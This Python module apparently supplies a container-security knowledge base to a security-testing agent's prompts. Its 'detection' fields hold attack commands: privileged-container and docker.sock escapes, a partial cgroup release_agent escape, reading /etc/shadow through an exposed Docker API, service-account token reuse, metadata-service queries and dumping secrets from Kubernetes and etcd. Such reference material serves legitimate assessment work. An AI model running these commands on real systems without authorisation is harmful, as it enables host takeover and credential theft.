"""Container and Docker security knowledge base.

Deep knowledge about container vulnerabilities:
1. Docker breakout and escape
2. Kubernetes pod security
3. Container runtime attacks
4. Image security and supply chain
5. Orchestration platform attacks
"""

from __future__ import annotations

from dataclasses import dataclass, field
from typing import Any

import structlog

logger = structlog.get_logger()


@dataclass
class ContainerPattern:
    """A container security pattern."""
    pattern_id: str = ""
    name: str = ""
    category: str = ""
    severity: str = "high"
    description: str = ""
    detection_strategy: str = ""
    tools: list[str] = field(default_factory=list)

    def to_dict(self) -> dict[str, Any]:
        return {
            "id": self.pattern_id,
            "name": self.name[:25],
            "category": self.category[:12],
        }


CONTAINER_PATTERNS: list[dict[str, Any]] = [
    {
        "id": "ct-001", "name": "Docker Container Escape",
        "category": "escape", "severity": "critical",
        "desc": "Techniques for escaping from Docker containers.",
        "detection": (
            "DOCKER CONTAINER ESCAPE:\n"
            "PRIVILEGED MODE:\n"
            "  # Check if running privileged\n"
            "  cat /proc/1/status | grep CapEff\n"
            "  # CapEff: 0000003fffffffff = privileged\n"
            "  # Mount host filesystem\n"
            "  mkdir /tmp/host && mount /dev/sda1 /tmp/host\n"
            "  # Access host via chroot\n"
            "  chroot /tmp/host\n"
            "DOCKER SOCKET:\n"
            "  # Check for mounted socket\n"
            "  ls -la /var/run/docker.sock\n"
            "  # If accessible, spawn privileged container\n"
            "  curl --unix-socket /var/run/docker.sock \\\n"
            "    http://localhost/containers/json\n"
            "  # Create and start privileged container\n"
            "  docker run -v /:/host --privileged -it alpine chroot /host\n"
            "CGROUPS ESCAPE (CVE-2022-0492):\n"
            "  # Abuse cgroup release_agent\n"
            "  # Requires CAP_SYS_ADMIN inside container\n"
            "  mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp\n"
            "  mkdir /tmp/cgrp/x\n"
            "  echo 1 > /tmp/cgrp/x/notify_on_release\n"
            "  host_path=$(sed -n 's/.*upperdir=\\([^,]*\\).*/\\1/p' /etc/mtab)\n"
            "  echo \"$host_path/cmd\" > /tmp/cgrp/release_agent\n"
            "KERNEL EXPLOIT:\n"
            "  - Dirty Pipe (CVE-2022-0847)\n"
            "  - Dirty COW (CVE-2016-5195)\n"
            "  - Container host shares kernel"
        ),
        "tools": ["docker", "deepce"],
    },
    {
        "id": "ct-002", "name": "Kubernetes Pod Security",
        "category": "k8s_pod", "severity": "high",
        "desc": "Kubernetes pod-level security assessment.",
        "detection": (
            "KUBERNETES POD SECURITY:\n"
            "SERVICE ACCOUNT TOKENS:\n"
            "  # Check for mounted SA token\n"
            "  cat /var/run/secrets/kubernetes.io/serviceaccount/token\n"
            "  # Use token to query API\n"
            "  APISERVER=https://kubernetes.default.svc\n"
            "  TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)\n"
            "  curl -sk $APISERVER/api/v1/namespaces/default/pods \\\n"
            "    -H \"Authorization: Bearer $TOKEN\"\n"
            "POD SECURITY STANDARDS:\n"
            "  # Check for violations\n"
            "  - Privileged containers\n"
            "  - hostPID, hostNetwork, hostIPC\n"
            "  - Capabilities: NET_RAW, SYS_ADMIN, SYS_PTRACE\n"
            "  - Writable root filesystem\n"
            "  - Run as root (UID 0)\n"
            "  - Privileged escalation (allowPrivilegeEscalation: true)\n"
            "TOOLS:\n"
            "  # kube-bench (CIS benchmark)\n"
            "  kube-bench run --targets node\n"
            "  # kubeaudit\n"
            "  kubeaudit all\n"
            "  # kubectl\n"
            "  kubectl auth can-i --list  # Check permissions\n"
            "  kubectl get pods -A  # All namespaces\n"
            "  kubectl get secrets -A  # All secrets"
        ),
        "tools": ["kubectl", "kube-bench", "kubeaudit"],
    },
    {
        "id": "ct-003", "name": "Container Runtime Attacks",
        "category": "runtime", "severity": "critical",
        "desc": "Attacks against container runtimes (Docker, containerd, CRI-O).",
        "detection": (
            "CONTAINER RUNTIME ATTACKS:\n"
            "DOCKER DAEMON:\n"
            "  - Exposed Docker API (port 2375/2376)\n"
            "  curl http://<target>:2375/version\n"
            "  curl http://<target>:2375/containers/json\n"
            "  # Remote code execution via exposed API\n"
            "  docker -H tcp://<target>:2375 run -v /:/mnt alpine cat /mnt/etc/shadow\n"
            "CONTAINERD:\n"
            "  - Exposed containerd socket\n"
            "  - ctr (containerd CLI) access\n"
            "  ctr -a /run/containerd/containerd.sock containers list\n"
            "RUNC VULNERABILITIES:\n"
            "  - CVE-2019-5736: runc container escape\n"
            "  - Overwrites host runc binary\n"
            "  - Triggered when exec into container\n"
            "PROC ESCAPE:\n"
            "  - /proc/sysrq-trigger accessible\n"
            "  - /proc/kcore readable\n"
            "  - /proc/kmsg readable\n"
            "  - /sys/firmware accessible\n"
            "DETECTION:\n"
            "  deepce.sh  # Docker enumeration tool\n"
            "  amicontained  # Check container restrictions\n"
            "  # Check capabilities\n"
            "  capsh --print"
        ),
        "tools": ["deepce", "amicontained"],
    },
    {
        "id": "ct-004", "name": "Container Network Security",
        "category": "network", "severity": "high",
        "desc": "Container network segmentation and security.",
        "detection": (
            "CONTAINER NETWORK SECURITY:\n"
            "NETWORK POLICIES:\n"
            "  # Check if NetworkPolicies exist\n"
            "  kubectl get networkpolicies -A\n"
            "  # Default: all pods can communicate\n"
            "  # Test cross-namespace communication\n"
            "  kubectl exec -it <pod> -- curl <target-service>\n"
            "DOCKER NETWORKING:\n"
            "  - Bridge mode: containers share bridge\n"
            "  - Host mode: container uses host network stack\n"
            "  - ARP spoofing between containers\n"
            "  - DNS spoofing on Docker internal DNS\n"
            "  # Check container network mode\n"
            "  docker inspect <container> | grep NetworkMode\n"
            "SERVICE MESH:\n"
            "  - Istio/Linkerd mTLS enforcement\n"
            "  - Sidecar injection verification\n"
            "  - Check for plaintext communication\n"
            "  - Envoy proxy misconfiguration\n"
            "METADATA SERVICE:\n"
            "  # Cloud metadata from container\n"
            "  curl http://169.254.169.254/latest/meta-data/\n"
            "  # GKE metadata\n"
            "  curl -H 'Metadata-Flavor: Google' http://169.254.169.254/\n"
            "  # Block with NetworkPolicy or IMDSv2"
        ),
        "tools": ["kubectl", "nmap"],
    },
    {
        "id": "ct-005", "name": "Container Secret Management",
        "category": "secrets", "severity": "critical",
        "desc": "Container and orchestration secret exposure.",
        "detection": (
            "CONTAINER SECRET MANAGEMENT:\n"
            "KUBERNETES SECRETS:\n"
            "  # List secrets\n"
            "  kubectl get secrets -A\n"
            "  # Decode secret (base64)\n"
            "  kubectl get secret <name> -o jsonpath='{.data}'\n"
            "  echo '<base64>' | base64 -d\n"
            "  # Secrets in env vars\n"
            "  kubectl exec <pod> -- env | grep -i pass\n"
            "  # Secrets in volumes\n"
            "  kubectl exec <pod> -- ls /var/run/secrets/\n"
            "DOCKER SECRETS:\n"
            "  # Environment variables\n"
            "  docker inspect <container> | grep -i env\n"
            "  # Docker secrets (Swarm)\n"
            "  docker secret ls\n"
            "  # .env files in image layers\n"
            "  docker history <image> --no-trunc\n"
            "ETCD:\n"
            "  # If etcd exposed (port 2379)\n"
            "  etcdctl get / --prefix --keys-only\n"
            "  etcdctl get /registry/secrets/default/<name>\n"
            "VAULT INTEGRATION:\n"
            "  - Check Vault agent sidecar\n"
            "  - Verify token rotation\n"
            "  - Check for hardcoded Vault tokens\n"
            "  - Review Vault policies"
        ),
        "tools": ["kubectl", "etcdctl"],
    },
]


class ContainerSecurityKB:
    """Container and Docker security knowledge base.

    Provides container vulnerability patterns
    injected into agent prompts.
    """

    def __init__(self) -> None:
        self._patterns: dict[str, ContainerPattern] = {}
        self._log = logger.bind(component="container_security_kb")
        self._load_patterns()

    def _load_patterns(self) -> None:
        """Load container patterns."""
        for data in CONTAINER_PATTERNS:
            pattern = ContainerPattern(
                pattern_id=data["id"],
                name=data["name"],
                category=data.get("category", ""),
                severity=data.get("severity", "high"),
                description=data.get("desc", ""),
                detection_strategy=data.get("detection", ""),
                tools=data.get("tools", []),
            )
            self._patterns[pattern.pattern_id] = pattern

    def get_by_category(self, category: str) -> list[ContainerPattern]:
        """Get patterns by category."""
        return [
            p for p in self._patterns.values()
            if p.category.lower() == category.lower()
        ]

    def build_container_prompt(
        self,
        categories: list[str] | None = None,
        max_patterns: int = 4,
    ) -> str:
        """Build container security prompt."""
        lines = ["## Container Security Patterns\n"]
        count = 0
        for pattern in self._patterns.values():
            if categories and pattern.category.lower() not in [c.lower() for c in categories]:
                continue
            if count >= max_patterns:
                break
            lines.append(f"### {pattern.name} [{pattern.category.upper()}]")
            lines.append(pattern.detection_strategy)
            lines.append("")
            count += 1
        return "\n".join(lines)

    def get_stats(self) -> dict[str, Any]:
        cat_counts: dict[str, int] = {}
        for p in self._patterns.values():
            cat_counts[p.category] = cat_counts.get(p.category, 0) + 1
        return {
            "patterns": len(self._patterns),
            "by_category": cat_counts,
        }
